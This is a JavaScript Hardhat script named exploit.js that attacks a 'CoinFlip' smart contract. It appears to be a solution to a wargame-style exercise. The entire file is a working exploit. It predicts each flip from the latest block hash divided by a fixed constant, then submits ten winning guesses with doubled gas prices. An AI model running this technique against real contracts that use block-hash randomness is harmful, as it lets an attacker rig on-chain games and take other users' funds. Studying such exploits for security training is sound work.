// exploit.js - Exploits the CoinFlip contract

// Import statements
require("dotenv").config();
const { ethers } = require("hardhat");
const { coinFlipAddress, coinFlipAbi } = require("../contracts");

// Helper functions
const FACTOR = ethers.utils.parseUnits('57896044618658097711785492504343953926634992332820282019728792003956564819968', 'wei');

const coinResult = async (provider, blockNumber) => {
    const block = await provider.getBlock(blockNumber);
    const blockValue = ethers.BigNumber.from(block.hash);
    console.log(ethers.utils.formatUnits(blockValue,'wei'));
    const flip = blockValue.div(FACTOR);
    console.log(flip);
    const side = flip.eq(ethers.constants.One) ? true : false;
    console.log(side);

    return side;
};

function delay(time) {
    return new Promise(resolve => setTimeout(resolve, time));
}


const main = async () => {
    // Create ethers signer and contract instances
    const provider = ethers.provider;
    const account = await ethers.getSigner();
    const coinFlip = new ethers.Contract(coinFlipAddress, coinFlipAbi);
    const coinFlipSigner = coinFlip.connect(account);

    let guesses = 0;
    let blockNumber, guess, txn, result, feeData, overrides;
    
    while (guesses < 10) {
        // Get block number and guess flip
        blockNumber = await provider.getBlockNumber();
        guess = await coinResult(provider, blockNumber);

        // Send transaction
        feeData = await provider.getFeeData();
        overrides = { gasPrice: feeData['gasPrice'].mul(2), gasLimit: ethers.utils.parseUnits('100000', 'wei') };
        txn = await coinFlipSigner.flip(guess, overrides);
        result = await txn.wait();
        console.log(result);
        guesses++;
        await delay(15000);
    }
};

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
